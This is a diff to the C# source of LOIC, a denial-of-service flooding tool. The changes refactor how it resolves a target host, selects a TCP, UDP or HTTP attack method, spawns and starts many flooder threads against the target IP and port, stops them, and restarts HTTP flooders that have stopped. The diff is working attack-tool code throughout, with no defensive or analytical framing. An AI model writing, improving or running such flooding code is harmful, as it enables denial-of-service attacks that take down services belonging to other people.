@@ -1,8 +1,8 @@
 ﻿using System;
+using System.Globalization;
 using System.Linq;
 using System.Net;
 using System.Windows.Forms;
-using System.Globalization;
 
 namespace LOIC
 {
@@ -42,11 +42,12 @@ namespace LOIC
 				}
 				return;
 			}
-			if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
-			else if (!url.StartsWith("http://")) url = String.Concat("http://", url);
+
+			if (!url.StartsWith("http://") && !url.StartsWith("https://")) url = String.Concat("http://", url);
 			try
 			{
-				txtTarget.Text = Dns.GetHostEntry(new Uri(url).Host).AddressList.Single().ToString();
+				IPAddress[] addresses = Dns.GetHostEntry(new Uri(url).Host).AddressList;
+				txtTarget.Text = (addresses.Length > 1 ? addresses[new Random().Next(addresses.Length)] : addresses.First()).ToString();
 			}
 			catch
 			{
@@ -96,11 +97,13 @@ namespace LOIC
 						throw new Exception("Select a target.");
 
 					iProtocol = 0;
-					if (String.Equals(cbMethod.Text, "TCP")) iProtocol = 1;
-					if (String.Equals(cbMethod.Text, "UDP")) iProtocol = 2;
-					if (String.Equals(cbMethod.Text, "HTTP")) iProtocol = 3;
-					if (iProtocol == 0)
-						throw new Exception("Select a proper attack method.");
+					switch (cbMethod.Text)
+					{
+						case "TCP": iProtocol = 1; break;
+						case "UDP": iProtocol = 2; break;
+						case "HTTP": iProtocol = 3; break;
+						default: throw new Exception("Select a proper attack method.");
+					}
 
 					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
 					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
@@ -129,32 +132,42 @@ namespace LOIC
 
 				cmdAttack.Text = "Stop flooding";
 
-				if (iProtocol == 1 || iProtocol == 2)
+				switch (iProtocol)
 				{
-					arr = new XXPFlooder[iThreads];
-					for (int a = 0; a < arr.Length; a++)
-					{
-						arr[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData);
-						arr[a].Start();
-					}
-				}
-				else if (iProtocol == 3)
-				{
-					arr = new HTTPFlooder[iThreads];
-					for (int a = 0; a < arr.Length; a++)
-					{
-						arr[a] = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout);
-						arr[a].Start();
-					}
+					case 1:
+					case 2:
+						{
+							arr = Enumerable.Range(0, iThreads)
+								.Select(i => new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData))
+								.ToArray();
+							break;
+						}
+					case 3:
+						{
+							arr = Enumerable.Range(0, iThreads)
+								.Select(i => new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout))
+								.ToArray();
+							break;
+						}
 				}
 
+				foreach (IFlooder f in arr)
+				{
+					f.Start();
+				}
 				tShowStats.Start();
 			}
 			else
 			{
 				attack = false;
 				cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
+
+				foreach (IFlooder f in arr)
+				{
+					f.Stop();
+				}
 				tShowStats.Stop();
+
 				arr = null;
 			}
 		}
@@ -164,73 +177,79 @@ namespace LOIC
 			if (intShowStats) return; intShowStats = true;
 
 			bool isFlooding = false;
-			if (iProtocol == 1 || iProtocol == 2)
+			switch (iProtocol)
 			{
-				int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
-				lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
-			}
-			if (iProtocol == 3)
-			{
-				int iIdle = 0;
-				int iConnecting = 0;
-				int iRequesting = 0;
-				int iDownloading = 0;
-				int iDownloaded = 0;
-				int iRequested = 0;
-				int iFailed = 0;
+				case 1:
+				case 2:
+					{
+						int iFloodCount = arr.Cast<XXPFlooder>().Sum(f => f.FloodCount);
+						lbRequested.Text = iFloodCount.ToString(CultureInfo.InvariantCulture);
+						break;
+					}
+				case 3:
+					{
+						int iIdle = 0;
+						int iConnecting = 0;
+						int iRequesting = 0;
+						int iDownloading = 0;
+						int iDownloaded = 0;
+						int iRequested = 0;
+						int iFailed = 0;
 
-				for (int a = 0; a < arr.Length; a++)
-				{
-					HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
-					iDownloaded += httpFlooder.Downloaded;
-					iRequested += httpFlooder.Requested;
-					iFailed += httpFlooder.Failed;
-					switch (httpFlooder.State)
-					{
-						case ReqState.Ready:
-						case ReqState.Completed:
-							{
-								iIdle++;
-								break;
-							}
-						case ReqState.Connecting:
-							{
-								iConnecting++;
-								break;
-							}
-						case ReqState.Requesting:
-							{
-								iRequesting++;
-								break;
-							}
-						case ReqState.Downloading:
-							{
-								iDownloading++;
-								break;
-							}
-					}
-					if (isFlooding && !httpFlooder.IsFlooding)
-					{
-						int iaDownloaded = httpFlooder.Downloaded;
-						int iaRequested = httpFlooder.Requested;
-						int iaFailed = httpFlooder.Failed;
-						httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
+						for (int a = 0; a < arr.Length; a++)
 						{
-							Downloaded = iaDownloaded,
-							Requested = iaRequested,
-							Failed = iaFailed
-						};
-						httpFlooder.Start();
-						arr[a] = httpFlooder;
+							HTTPFlooder httpFlooder = (HTTPFlooder)arr[a];
+							iDownloaded += httpFlooder.Downloaded;
+							iRequested += httpFlooder.Requested;
+							iFailed += httpFlooder.Failed;
+							switch (httpFlooder.State)
+							{
+								case ReqState.Ready:
+								case ReqState.Completed:
+									{
+										iIdle++;
+										break;
+									}
+								case ReqState.Connecting:
+									{
+										iConnecting++;
+										break;
+									}
+								case ReqState.Requesting:
+									{
+										iRequesting++;
+										break;
+									}
+								case ReqState.Downloading:
+									{
+										iDownloading++;
+										break;
+									}
+							}
+							if (isFlooding && !httpFlooder.IsFlooding)
+							{
+								int iaDownloaded = httpFlooder.Downloaded;
+								int iaRequested = httpFlooder.Requested;
+								int iaFailed = httpFlooder.Failed;
+								httpFlooder = new HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
+								{
+									Downloaded = iaDownloaded,
+									Requested = iaRequested,
+									Failed = iaFailed
+								};
+								httpFlooder.Start();
+								arr[a] = httpFlooder;
+							}
+						}
+						lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
+						lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
+						lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
+						lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
+						lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
+						lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
+						lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
+						break;
 					}
-				}
-				lbFailed.Text = iFailed.ToString(CultureInfo.InvariantCulture);
-				lbRequested.Text = iRequested.ToString(CultureInfo.InvariantCulture);
-				lbDownloaded.Text = iDownloaded.ToString(CultureInfo.InvariantCulture);
-				lbDownloading.Text = iDownloading.ToString(CultureInfo.InvariantCulture);
-				lbRequesting.Text = iRequesting.ToString(CultureInfo.InvariantCulture);
-				lbConnecting.Text = iConnecting.ToString(CultureInfo.InvariantCulture);
-				lbIdle.Text = iIdle.ToString(CultureInfo.InvariantCulture);
 			}
 
 			intShowStats = false;
